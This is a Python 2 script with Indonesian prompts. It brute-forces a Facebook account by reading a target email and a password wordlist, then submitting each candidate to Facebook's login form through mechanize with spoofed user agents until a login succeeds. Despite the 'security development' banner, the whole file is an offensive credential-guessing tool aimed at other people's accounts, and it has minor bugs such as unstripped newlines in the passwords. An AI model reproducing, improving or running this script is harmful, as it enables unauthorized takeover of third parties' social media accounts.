#!/usr/bin/env python
# -*- coding: UTF-8 -*-
	
	
import os
import sys
import mechanize
import cookielib
import random 
import time

os.system('clear')

def runntek(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(10. / 100)

if sys.platform == "linux" or sys.platform == "linux2":
     GL = "\033[96;1m" # Blue aqua
     BB = "\033[34;1m" # Blue light
     YY = "\033[33;1m" # Yellow light
     GG = "\033[32;1m" # Green light
     WW = "\033[0;1m"  # White light
     RR = "\033[31;1m" # Red light
     CC = "\033[36;1m" # Cyan light
     B = "\033[34m"    # Blue
     Y = "\033[33;1m"    # Yellow
     G = "\033[32m"    # Green
     W = "\033[0;1m"     # White
     R = "\033[31m"    # Red
     C = "\033[36;1m"    # Cyan
     rand = (BB,YY,GG,WW,RR,CC)
     P = random.choice(rand)
def cover():
    print """
    
    
    
    
     """
    runntek(BB+"          ███████████████  OSIF...F8 MODULE. . ...")
    time.sleep(1)
    print " "
    print RR+"  +============================================+"
    print RR+"  | PROGRAM PENGEMBANGAN SYSTEM KEAMANAN M3DPR0|"
    print RR+"  +============================================+"
    print RR+"  |         SCRIPT     : File OSIF             |"
    print RR+"  |         REPOSTORY  : SAN-Brother           |"
    print RR+"  |         CODER	     : Susanto              |"
    print RR+"  |         PROGRAM    : Versi.1.0.1           |"
    print RR+"  |--------------------------------------------|"
    print RR+"  |     OPEN SOURC INFORMATION FACEBOOK F8     |"
    print RR+"  |--------------------------------------------|"
    print RR+"  +============================================+" 


######

email = str(raw_input(BB+"Target Crack... \033[33;1m: "))

passwordlist = str(raw_input(BB+" Code Password... \033[95m[ pass.txt ] \033[92;1m: "))


#login = 'https://m.facebook.com/login/?ref=dbl&fl&refid=8'


login = 'https://www.facebook.com/login.php?login_attempt=1'


useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]


def runntek(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(10. / 100)

def main():
        global br
        br = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        br.set_handle_robots(False)
        br.set_handle_redirect(True)
        br.set_cookiejar(cj)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        welcome()
        search()
        print " "
        runntek(RR+"  Wordlis Tidak Ada yang Cocok")
        runntek(RR+"  Gunakan PasswordList yg lain!")
        time.sleep(1)
        print WW+34*"  -"
        kol()

def kol():
    nok = raw_input("Keluar program \033[96;1m[y/n]: ")
    if nok == "y":
        print ("Membuat...\033[92;1m[ nano pass.txt ] !")
        print WW+(41*"-")
        print GL+(" ")
        os.sys.exit()
    else:
        exit(0)
def brute(password):
        sys.stdout.write(RR+"\r[+]\033[97;1m Mencoba... {}\n".format(password))
        sys.stdout.flush()
        br.addheaders = [('User-agent', random.choice(useragents))]
        site = br.open(login)
        br.select_form(nr = 0)
        br.form['email'] = email
        br.form['pass'] = password
        sub = br.submit()
        log = sub.geturl()
        if log != login and (not 'login_attempt' in log):
                        print("\033[92;1m\n\n[+]\033[97;1m Password Ditemukan \033[31;1m===| \033[96;1m{}".format(password)) 
                        print " "
                        raw_input(WW+"LANGSUNG EKSEKUSI!!!")
                        sys.exit(1)


def search():
        global password
        passwords = open(passwordlist,"r")
        for password in passwords:
                passwords = password.replace("\n","")
                brute(password)


#welcome
def welcome():
        wel = GG+" Tunggu sebentar... \033[96;4m"
        print wel
        print " "
        total = open(passwordlist,"r")
        total = total.readlines()
        print " "
        print GL+" [*] Crack Akun : {}".format(email)
        print RR+" [*] Password Terbaca :" , len(total),WW+ "passwords"
	print " "
        runntek(RR+" █████████████ ")
	runntek(RR+" Sedang memulai ...")
        time.sleep(1)

if __name__ == '__main__':
        main()
